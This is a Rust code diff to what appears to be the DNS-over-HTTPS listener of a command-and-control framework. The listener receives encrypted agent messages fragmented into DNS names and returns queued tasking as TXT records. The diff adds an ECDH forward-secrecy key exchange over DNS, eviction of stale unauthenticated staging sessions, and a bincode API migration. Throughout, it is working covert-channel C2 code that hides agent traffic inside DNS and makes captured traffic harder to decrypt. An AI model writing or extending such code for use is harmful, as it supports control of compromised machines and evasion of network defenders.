@@ -32,6 +32,11 @@ const TYPE_TXT: u16 = 16;
 const DOH_SESSION_SWEEP_INTERVAL_SECS: u64 = 60;
 const DOH_SESSION_TIMEOUT_DEFAULT_SECS: u64 = 300;
 const DOH_RATE_LIMIT_DEFAULT_QPS: u32 = 10;
+/// Maximum number of concurrent unauthenticated staging sessions.
+/// When exceeded the oldest staging session (by `last_activity`) is evicted
+/// before a new one is created, preventing memory exhaustion from partial
+/// DNS queries that never complete authentication.
+const DOH_STAGING_CAPACITY: usize = 4_096;
 
 #[derive(Clone)]
 struct DohRuntime {
@@ -41,6 +46,8 @@ struct DohRuntime {
     beacon_sentinel: Ipv4Addr,
     idle_ip: Ipv4Addr,
     crypto: Arc<CryptoSession>,
+    /// Raw PSK bytes — needed to bootstrap per-session ECDH key exchange.
+    psk: Arc<Vec<u8>>,
     /// Fully-authenticated sessions visible on the dashboard.
     sessions: Arc<DashMap<String, Arc<Mutex<DohSession>>>>,
     /// Unauthenticated staging area. Sessions live here until the sender
@@ -65,6 +72,8 @@ struct DohSession {
     outbound_queue: VecDeque<Message>,
     last_activity: Instant,
     authenticated: bool,
+    /// ECDH-derived crypto session (replaces static PSK once established).
+    ecdh_session: Option<Arc<CryptoSession>>,
 }
 
 impl DohRuntime {
@@ -95,6 +104,7 @@ impl DohRuntime {
             beacon_sentinel,
             idle_ip,
             crypto: Arc::new(CryptoSession::from_shared_secret(agent_secret.as_bytes())),
+            psk: Arc::new(agent_secret.as_bytes().to_vec()),
             sessions: Arc::new(DashMap::new()),
             staging: Arc::new(DashMap::new()),
             rate_limit_qps,
@@ -116,6 +126,27 @@ impl DohRuntime {
         match self.staging.entry(session_id.to_string()) {
             Entry::Occupied(o) => o.get().clone(),
             Entry::Vacant(v) => {
+                // M-12: evict oldest staging sessions when at capacity.
+                if self.staging.len() >= DOH_STAGING_CAPACITY {
+                    let now = Instant::now();
+                    let mut oldest_key: Option<String> = None;
+                    let mut oldest_age = Duration::ZERO;
+                    for entry in self.staging.iter() {
+                        let guard = match entry.value().lock() {
+                            Ok(g) => g,
+                            Err(poisoned) => poisoned.into_inner(),
+                        };
+                        let age = now.saturating_duration_since(guard.last_activity);
+                        if age > oldest_age {
+                            oldest_age = age;
+                            oldest_key = Some(entry.key().clone());
+                        }
+                    }
+                    if let Some(key) = oldest_key {
+                        self.staging.remove(&key);
+                    }
+                }
+
                 let session = Arc::new(Mutex::new(DohSession {
                     connection_id: format!("doh-{session_id}"),
                     fragments: BTreeMap::new(),
@@ -131,6 +162,7 @@ impl DohRuntime {
                     outbound_queue: VecDeque::new(),
                     last_activity: Instant::now(),
                     authenticated: false,
+                    ecdh_session: None,
                 }));
                 v.insert(session.clone());
                 session
@@ -246,6 +278,15 @@ impl DohRuntime {
                     chunk: chunk.clone(),
                 })
             }
+            // ECDH init: {init_data}.{ecdh_prefix}.{session_hex}.{domain}
+            [init_data, kind, session_id]
+                if kind == common::ioc::IOC_DNS_ECDH && is_hex(session_id) =>
+            {
+                Some(ParsedName::EcdhInit {
+                    session_id: session_id.clone(),
+                    init_data: init_data.clone(),
+                })
+            }
             _ => None,
         }
     }
@@ -305,6 +346,18 @@ impl DohRuntime {
                     answers: self.pop_tasking_answers(&session_id),
                 }
             }
+            ParsedName::EcdhInit {
+                session_id,
+                init_data,
+            } => {
+                if qtype != TYPE_TXT {
+                    return ResolveResult {
+                        rcode: 0,
+                        answers: Vec::new(),
+                    };
+                }
+                self.handle_ecdh_init(&session_id, &init_data)
+            }
         }
     }
 
@@ -337,7 +390,7 @@ impl DohRuntime {
             return Vec::new();
         };
 
-        let plain = match bincode::serialize(&msg) {
+        let plain = match bincode::serde::encode_to_vec(&msg, bincode::config::legacy()) {
             Ok(v) => v,
             Err(e) => {
                 tracing::warn!("failed to serialize pending DoH task: {e}");
@@ -345,7 +398,18 @@ impl DohRuntime {
             }
         };
 
-        let ciphertext = self.crypto.encrypt(&plain);
+        // Use ECDH session if established, otherwise fall back to PSK.
+        let ciphertext = {
+            let guard = match session.lock() {
+                Ok(g) => g,
+                Err(poisoned) => poisoned.into_inner(),
+            };
+            if let Some(ref ecdh) = guard.ecdh_session {
+                ecdh.encrypt(&plain)
+            } else {
+                self.crypto.encrypt(&plain)
+            }
+        };
         let b32 = b32_encode(&ciphertext).to_ascii_lowercase();
         if b32.is_empty() {
             return Vec::new();
@@ -355,6 +419,62 @@ impl DohRuntime {
             .chunks(255)
             .map(|c| Answer::Txt(String::from_utf8_lossy(c).to_string()))
             .collect()
+    }
+
+    /// Handle an ECDH forward-secrecy key exchange initiated by the agent.
+    ///
+    /// The agent sends: `{base64url(pubkey||self_hmac)}.{IOC_DNS_ECDH}.{session_hex}.{domain}`
+    /// We respond with a TXT record containing: `base64url(server_pubkey||response_hmac)`
+    fn handle_ecdh_init(&self, session_id: &str, init_data: &str) -> ResolveResult {
+        use common::forward_secrecy::HttpEcdhServerSession;
+
+        // The agent encodes the ECDH payload as URL-safe base64 without
+        // padding for DNS subdomain compatibility.  Convert back to standard
+        // base64 so `HttpEcdhServerSession::new` can decode it.
+        let standard_b64 = init_data
+            .replace('-', "+")
+            .replace('_', "/");
+
+        let server_session = match HttpEcdhServerSession::new(&self.psk, &standard_b64) {
+            Ok(s) => s,
+            Err(e) => {
+                tracing::warn!(
+                    session_id = %session_id,
+                    "DoH ECDH init failed: {e}"
+                );
+                return ResolveResult {
+                    rcode: 2, // SERVFAIL
+                    answers: Vec::new(),
+                };
+            }
+        };
+
+        let response_value = server_session.response_header_value();
+        let ecdh_crypto = server_session.into_session();
+
+        // Store the ECDH session on the DoH session (authenticated or staging).
+        let session = self
+            .get_authenticated_session(session_id)
+            .unwrap_or_else(|| self.get_or_create_staging_session(session_id));
+        {
+            let mut guard = match session.lock() {
+                Ok(g) => g,
+                Err(poisoned) => poisoned.into_inner(),
+            };
+            guard.ecdh_session = Some(Arc::new(ecdh_crypto));
+            guard.last_activity = Instant::now();
+        }
+
+        tracing::info!(
+            session_id = %session_id,
+            "DoH ECDH session established"
+        );
+
+        // Return TXT record with server's pubkey + HMAC.
+        ResolveResult {
+            rcode: 0,
+            answers: vec![Answer::Txt(response_value)],
+        }
     }
 
     fn handle_fragment(&self, session_id: &str, seq: u32, chunk: &str) {
@@ -403,7 +523,17 @@ impl DohRuntime {
             if guard.next_seq.is_none() {
                 guard.next_seq = Some(seq);
             }
-            try_reassemble_messages(&mut guard, &self.crypto)
+
+            // Clone the Arc<ECDH session> if present, so we can decrypt
+            // without borrowing the guard.
+            let ecdh_session = guard.ecdh_session.clone();
+
+            // Use ECDH session if established, otherwise fall back to PSK.
+            let crypto_ref: &CryptoSession = ecdh_session
+                .as_ref()
+                .map(|arc| arc.as_ref())
+                .unwrap_or(&self.crypto);
+            try_reassemble_messages(&mut guard, crypto_ref)
         };
 
         if msgs.is_empty() {
@@ -661,7 +791,7 @@ fn try_reassemble_messages(sess: &mut DohSession, crypto: &CryptoSession) -> Vec
 
             if let Some(ciphertext) = b32_decode(&assembled) {
                 if let Ok(plain) = crypto.decrypt(&ciphertext) {
-                    if let Ok(msg) = bincode::deserialize::<Message>(&plain) {
+                    if let Ok(msg) = bincode::serde::decode_from_slice(&plain, bincode::config::legacy()).map(|(v, _)| v) {
                         resolved = Some((seq, msg));
                         break;
                     }
@@ -706,6 +836,12 @@ enum ParsedName {
     },
     Task {
         session_id: String,
+    },
+    /// ECDH forward-secrecy key exchange initiated by the agent.
+    EcdhInit {
+        session_id: String,
+        /// Base64url-encoded agent ECDH init payload (pubkey + HMAC).
+        init_data: String,
     },
 }
 
@@ -812,6 +948,7 @@ pub async fn run(
         let tls_cfg = crate::tls::build(
             state.app.config.tls_cert_path.as_deref(),
             state.app.config.tls_key_path.as_deref(),
+            false,
         )
         .await?
         .get_inner();
